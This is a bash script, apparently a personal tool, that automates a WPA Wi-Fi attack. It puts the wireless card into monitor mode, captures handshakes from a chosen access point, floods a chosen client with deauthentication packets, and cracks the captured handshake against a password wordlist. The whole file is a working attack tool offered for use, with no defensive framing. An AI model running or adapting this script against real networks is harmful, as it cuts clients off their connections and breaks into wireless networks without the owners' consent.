#!/bin/bash

blue="\e[1;34m"
echo -e $blue

airmon-ng check kill
#sleep 2
airmon-ng start wlan0
gnome-terminal -- airodump-ng wlan0mon 
echo ""
echo ""
# bash /root/Scripts/wpa/wpa_clear.sh &> /dev/null #bash script to clear previous written files of wpa-01.cap, wpa-01.csv etc..
wpa_clear &> /dev/null #bash script to clear previous written files of wpa-01.cap, wpa-01.csv etc..

read -p "Do you want to continue with Advanced Monitoring(y/n)?: " ch1
if [ $ch1 == y ]
	then
	read -p "Enter the BSSID of AP: "  bssid 
	read -p "Enter the channel: " ch
		
	gnome-terminal -- airodump-ng --bssid $bssid --channel $ch --write /root/Scripts/wpa/wpa wlan0mon
	
fi
#echo ""
red="\e[1;91m"
echo -e $red
read -p "Do you want to perfrom Deauthentication Attack(y/n)?: " ch2
if [ $ch2 == y ]
	then
	read -p "Enter the MAC-Address of the client to Deauthenticate: " mac
	#read -p "Enter the number of Deauthentication packets: " nodeauth
	#aireplay-ng --deauth $nodeauth -a $bssid -c $mac wlan0mon
	gnome-terminal -- aireplay-ng --deauth 100 -a $bssid -c $mac wlan0mon
	sleep 2
	
fi
echo ""

green="\e[1;92m"
echo -e $green

  read -p "Do you want to Crack WiFi Password(y/n)?: " ch3
if [ $ch3 == y ]
	then
	# aircrack-ng -w /usr/share/wordlists/fasttrack.txt /root/Scripts/fluxion/HUAWEI-F0:3F:95:92:2E:18.cap
	aircrack-ng -w /usr/share/wordlists/fasttrack.txt /root/Scripts/wpa/wpa-01.cap
fi

airmon-ng stop wlan0mon
service network-manager start
ipflush &> /dev/null
